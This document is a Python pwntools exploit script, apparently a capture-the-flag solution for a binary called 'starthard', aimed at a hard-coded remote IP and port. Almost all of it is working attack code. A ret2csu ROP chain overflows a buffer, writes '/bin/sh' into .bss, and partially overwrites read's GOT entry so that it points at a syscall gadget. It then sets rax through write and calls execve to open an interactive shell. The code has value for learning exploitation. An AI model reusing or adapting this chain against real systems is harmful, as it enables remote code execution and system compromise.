from pwn import *
#io = process('./starthard')
io = remote('128.199.152.175',10001)
elf = ELF('./starthard')
pause()
context.log_level = 'debug'

#common gadgets in x86_64 ELF
#.text:00000000004005A0 loc_4005A0:                             ; CODE XREF: init+54j
#.text:00000000004005A0                 mov     rdx, r13
#.text:00000000004005A3                 mov     rsi, r14
#.text:00000000004005A6                 mov     edi, r15d
#.text:00000000004005A9                 call    qword ptr [r12+rbx*8]
#.text:00000000004005AD                 add     rbx, 1
#.text:00000000004005B1                 cmp     rbx, rbp
#.text:00000000004005B4                 jnz     short loc_4005A0
#.text:00000000004005B6
#.text:00000000004005B6 loc_4005B6:                             ; CODE XREF: init+34j
#.text:00000000004005B6                 add     rsp, 8
#.text:00000000004005BA                 pop     rbx
#.text:00000000004005BB                 pop     rbp
#.text:00000000004005BC                 pop     r12
#.text:00000000004005BE                 pop     r13
#.text:00000000004005C0                 pop     r14
#.text:00000000004005C2                 pop     r15
#.text:00000000004005C4                 retn
#.text:00000000004005C4 init            endp

part1 = 0x4005b6
part2 = 0x4005a0

pop_rbp_ret = 0x0000000000400490
leave_ret = 0x0000000000400550
read_plt = elf.plt['read']
bss = 0x601200
read_got = elf.got['read']
libc_main = elf.got['__libc_start_main']
mov_eax = 0x000000000040054b #  mov eax, 0 ; leave ; ret

def call_function(call_addr, arg1, arg2, arg3):
	payload = ''
	payload += p64(part1) 
	payload += 'a' * 8#=>RSP
	payload += p64(0) #=>RBX
	payload += p64(1) #=>RBP
	payload += p64(call_addr) #=>R12=>RIP
	payload += p64(arg3) #=>R13=>RDX
	payload += p64(arg2) #=>R14=>RSI
	payload += p64(arg1) #=>R15=>RDI
	payload += p64(part2)
	payload += 'b' * 0x38
	return payload	

payload = 'a' * 0x18
payload += call_function(read_got, 0, bss, 0x30) # read to bss
payload += call_function(read_got, 0, read_got, 1) # change the read_got
payload += call_function(read_got, 1, libc_main, 59) # use write to set rax = 59
payload += call_function(read_got, bss, 0, 0) # execve('/bin/sh', 0, 0)
io.sendline(payload)
pause()

io.send('/bin/sh\x00') # mov /bin/sh to a place that we know the addr
pause()

io.send('\x7e') # set the last byte of read_got to 0x7e which syscall located
pause()

io.interactive()

